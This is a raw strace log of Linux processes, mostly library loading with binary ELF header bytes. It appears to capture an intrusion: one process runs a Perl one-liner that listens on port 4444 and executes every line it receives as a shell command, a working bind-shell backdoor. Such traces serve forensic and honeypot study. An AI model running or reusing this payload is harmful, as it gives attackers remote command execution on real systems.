\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
18437 12:54:35.839160 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
18437 12:54:35.839177 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d89000
18437 12:54:35.839189 mmap2(0xb7d90000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d90000
18437 12:54:35.839206 close(1)          = 0
18437 12:54:35.839218 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18437 12:54:35.839231 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
18437 12:54:35.839245 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
18437 12:54:35.839417 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
18437 12:54:35.839435 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d71000
18437 12:54:35.839450 mmap2(0xb7d85000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d85000
18437 12:54:35.839466 mmap2(0xb7d87000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d87000
18437 12:54:35.839480 close(1)          = 0
18437 12:54:35.839506 munmap(0xb7f17000, 29913) = 0
18437 12:54:35.839523 open("/etc/ld.so.cache", O_RDONLY) = 1
18437 12:54:35.839536 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
18437 12:54:35.839552 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f17000
18437 12:54:35.839562 close(1)          = 0
18437 12:54:35.839572 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18437 12:54:35.839587 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
18437 12:54:35.839601 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
18437 12:54:35.839691 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
18437 12:54:35.839708 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d67000
18437 12:54:35.839720 mmap2(0xb7d6f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d6f000
18437 12:54:35.839736 close(1)          = 0
18437 12:54:35.839748 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18437 12:54:35.839761 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
18437 12:54:35.839776 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
18437 12:54:35.839865 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
18437 12:54:35.839882 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d5c000
18437 12:54:35.839915 mmap2(0xb7d65000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d65000
18437 12:54:35.839933 close(1)          = 0
18437 12:54:35.839954 munmap(0xb7f17000, 29913) = 0
18437 12:54:35.839970 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
18437 12:54:35.839988 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
18437 12:54:35.840000 _llseek(1, 0, [0], SEEK_CUR) = 0
18437 12:54:35.840012 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
18437 12:54:35.840028 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f1e000
18437 12:54:35.840039 _llseek(1, 1624, [1624], SEEK_SET) = 0
18437 12:54:35.840054 munmap(0xb7f1e000, 1624) = 0
18437 12:54:35.840063 close(1)          = 0
18437 12:54:35.840092 getpgrp()         = 3831
18437 12:54:35.840102 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
18437 12:54:35.840117 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
18437 12:54:35.840133 brk(0x8101000)    = 0x8101000
18437 12:54:35.840164 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18437 12:54:35.840178 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18437 12:54:35.840192 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18437 12:54:35.840229 brk(0x8102000)    = 0x8102000
18437 12:54:35.840256 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
18437 12:54:35.840275 stat64("/sbin/AB", 0xbfcbd318) = -1 ENOENT (No such file or directory)
18437 12:54:35.840287 stat64("/bin/AB", 0xbfcbd318) = -1 ENOENT (No such file or directory)
18437 12:54:35.840299 stat64("/usr/sbin/AB", 0xbfcbd318) = -1 ENOENT (No such file or directory)
18437 12:54:35.840311 stat64("/usr/bin/AB", 0xbfcbd318) = -1 ENOENT (No such file or directory)
18437 12:54:35.840324 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
18437 12:54:35.840338 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d926f8) = 18438
18438 12:54:35.840385 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18438 12:54:35.840412 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
18438 12:54:35.840425 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
18438 12:54:35.840437 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
18438 12:54:35.840453 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
18438 12:54:35.840469 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
18438 12:54:35.840482 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
18438 12:54:35.840539 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
18438 12:54:35.840552 --- SIGPIPE (Broken pipe) @ 0 (0) ---
18438 12:54:35.840622 exit_group(127)   = ?
18437 12:54:35.846729 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18437 12:54:35.846730 --- SIGCHLD (Child exited) @ 0 (0) ---
18437 12:54:35.846730 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 18438
18437 12:54:35.846730 waitpid(-1, 0xbfcbcf98, WNOHANG) = -1 ECHILD (No child processes)
4519  12:54:35.846730 waitpid(18437,  <unfinished ...>
18437 12:54:35.846731 sigreturn()       = ? (mask now [])
18437 12:54:35.846731 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
18437 12:54:35.846731 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18437 12:54:35.846731 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
18437 12:54:35.846731 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
18437 12:54:35.846732 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18437 12:54:35.846732 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
18437 12:54:35.846732 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
18437 12:54:35.846732 stat64("/sbin/perl", 0xbfcbd348) = -1 ENOENT (No such file or directory)
18437 12:54:35.846733 stat64("/bin/perl", 0xbfcbd348) = -1 ENOENT (No such file or directory)
18437 12:54:35.846733 stat64("/usr/sbin/perl", 0xbfcbd348) = -1 ENOENT (No such file or directory)
18437 12:54:35.846743 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
18437 12:54:35.846760 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
18437 12:54:35.846785 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
18437 12:54:35.846799 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d926f8) = 18439
18439 12:54:35.846873 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18439 12:54:35.846890 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
18439 12:54:35.846921 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
18439 12:54:35.846933 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
18439 12:54:35.846948 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
18439 12:54:35.846963 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
18439 12:54:35.846976 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
18439 12:54:35.847008 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
18439 12:54:35.847090 brk(0)            = 0x8153000
18439 12:54:35.847109 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18439 12:54:35.847124 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5d000
18439 12:54:35.847140 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
18439 12:54:35.847156 open("/etc/ld.so.cache", O_RDONLY) = 1
18439 12:54:35.847168 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
18439 12:54:35.847185 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f55000
18439 12:54:35.847195 close(1)          = 0
18439 12:54:35.847206 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18439 12:54:35.847221 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
18439 12:54:35.847235 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
18439 12:54:35.847336 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
18439 12:54:35.847354 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f51000
18439 12:54:35.847367 mmap2(0xb7f53000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f53000
18439 12:54:35.847383 close(1)          = 0
18439 12:54:35.847394 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18439 12:54:35.847408 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
18439 12:54:35.847422 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
18439 12:54:35.847514 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
18439 12:54:35.847531 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f2c000
18439 12:54:35.847542 mmap2(0xb7f4f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f4f000
18439 12:54:35.847558 close(1)          = 0
18439 12:54:35.847570 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18439 12:54:35.847583 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
18439 12:54:35.847597 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
18439 12:54:35.847685 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
18439 12:54:35.847714 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f2b000
18439 12:54:35.847727 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f13000
18439 12:54:35.847737 mmap2(0xb7f27000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f27000
18439 12:54:35.847751 mmap2(0xb7f29000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f29000
18439 12:54:35.847764 close(1)          = 0
18439 12:54:35.847775 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18439 12:54:35.847788 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
18439 12:54:35.847801 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
18439 12:54:35.847984 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
18439 12:54:35.848001 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc4000
18439 12:54:35.848012 mmap2(0xb7f0d000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f0d000
18439 12:54:35.848029 mmap2(0xb7f10000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f10000
18439 12:54:35.848042 close(1)          = 0
18439 12:54:35.848054 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18439 12:54:35.848066 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
18439 12:54:35.848080 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, 